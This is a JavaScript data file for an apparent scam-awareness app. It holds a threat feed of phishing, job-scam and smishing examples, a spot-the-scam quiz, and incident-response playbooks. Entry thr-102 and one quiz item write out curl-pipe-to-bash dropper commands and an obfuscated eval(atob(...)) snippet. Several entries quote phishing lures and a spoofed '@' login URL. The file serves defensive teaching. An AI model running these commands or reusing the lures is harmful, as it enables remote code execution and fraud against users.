// Community Threat Feed, Spot-the-Scam Quiz & Emergency Playbooks
(function (global) {
  const SG = (global.SentinelGrid = global.SentinelGrid || {});

  SG.DEFAULT_THREAT_FEED = [
    {
      id: 'thr-101',
      category: 'Phishing',
      severity: 'Critical',
      title: 'Fake Bank KYC Suspension SMS with Shortened URL',
      indicator: 'URGENT: Account suspended in 24h! Verify OTP & PAN at bit.ly/[REDACTED]',
      notes: 'Uses fear + shortened link to harvest banking OTPs and national IDs.',
      votes: 142,
      timestamp: '2 hours ago'
    },
    {
      id: 'thr-102',
      category: 'Code Bug / Malware',
      severity: 'Critical',
      title: 'NPM / GitHub PR Trojan Using Base64 eval(atob(...))',
      indicator: 'eval(atob("aW1wb3J0IG9z...")) + curl http://[REDACTED_IP]/dropper.sh | bash',
      notes: 'Sent by fake contributor claiming to fix a UI bug; runs remote shell dropper.',
      votes: 98,
      timestamp: '5 hours ago'
    },
    {
      id: 'thr-103',
      category: 'Crypto / Job Scam',
      severity: 'High',
      title: 'Remote "Like Videos for $400/day" Task Deposit Scam',
      indicator: 'Earn $350-$600 daily liking videos. Pay refundable VIP deposit on Telegram @hr_fastpay_bot',
      notes: 'Lures job seekers with easy daily payouts, then steals escalating deposits.',
      votes: 215,
      timestamp: '1 day ago'
    },
    {
      id: 'thr-104',
      category: 'Malicious Link',
      severity: 'High',
      title: 'OAuth Spoof Using `@` Authority Trick & Punycode',
      indicator: 'https://accounts.google.com@login-paypa1-security.xyz/oauth/verify',
      notes: 'Browser ignores username before `@` and connects to lookalike `.xyz` host.',
      votes: 87,
      timestamp: '1 day ago'
    },
    {
      id: 'thr-105',
      category: 'SMS Smishing',
      severity: 'Medium',
      title: 'Parcel Delivery $2.99 Customs Fee Card Harvester',
      indicator: 'Package #US99281 held for $2.99 fee. Confirm card CVV at usps-redelivery-fee.click',
      notes: 'Small fee lowers suspicion while capturing full credit card numbers.',
      votes: 164,
      timestamp: '2 days ago'
    }
  ];

  SG.QUIZ_QUESTIONS = [
    {
      prompt: 'SMS from "BANK-ALERT": "Dear customer, your debit card is blocked today. Update KYC within 2 hours at http://bit.ly/bank-kyc99 to avoid ₹10,000 penalty."',
      answer: 'scam',
      explanation: 'Red flags: Artificial 2-hour urgency, penalty threat, and a shortened bit.ly link instead of the bank’s official domain.'
    },
    {
      prompt: 'Email from `security@github.com`: "A new SSH key was added to your account. If this wasn’t you, sign in directly at github.com/settings/keys to revoke it." (No direct password/OTP form attached).',
      answer: 'safe',
      explanation: 'This is a standard security notification directing you to navigate manually to the official domain without asking for an OTP or urgent payment.'
    },
    {
      prompt: 'Code snippet sent by a stranger on Discord: `subprocess.run("curl -s http://198.51.100.9/init.sh | bash", shell=True)` — "Just run this quick setup fix!"',
      answer: 'scam',
      explanation: 'Never pipe an unverified remote IP script into `bash` with `shell=True`. That is a classic remote dropper / malware bug.'
    },
    {
      prompt: 'WhatsApp message: "Hi! I am a recruiter. Earn $500/day reviewing products from home. Just deposit $50 USDT to unlock VIP tasks."',
      answer: 'scam',
      explanation: 'Legitimate employers never ask candidates to pay a deposit or cryptocurrency fee to unlock wages or tasks.'
    }
  ];

  SG.PLAYBOOKS = {
    clicked: [
      'Disconnect the device from Wi-Fi / mobile data if a file started downloading.',
      'Do NOT enter any passwords, OTPs, or payment details on the opened page.',
      'Run an updated antivirus / anti-malware scan on your phone or computer.',
      'Clear browser cache/cookies for that site and inspect browser extensions for unfamiliar additions.'
    ],
    otp: [
      'Immediately call your bank / card issuer using the official number on the back of your card to freeze transactions.',
      'Change the affected account password right away from a clean device (and any other site using that same password).',
      'Enable hardware/app-based 2FA (Authenticator app) instead of SMS OTP where available.',
      'Check account login history and revoke unfamiliar active sessions or API tokens.'
    ],
    paid: [
      'Contact your bank, UPI app, or card network within minutes to file a fraud dispute / chargeback.',
      'Save screenshots of the scam message, transaction ID, and recipient handle/wallet.',
      'Report immediately to your national cybercrime helpline (e.g., 1930 in India, IC3.gov in the US, Action Fraud in the UK).',
      'Beware of "recovery scammers" who DM you claiming they can hack back your lost money for a fee.'
    ],
    ran: [
      'Kill the running process and isolate the machine from your network immediately.',
      'Rotate every API key, SSH key, `.env` secret, and browser-saved password that was accessible on that machine.',
      'Inspect startup items, cron jobs, and `git diff` / `package.json` scripts for persistence backdoors.',
      'Reinstall from a trusted backup or clean OS image if root/admin access was granted.'
    ]
  };
})(window);
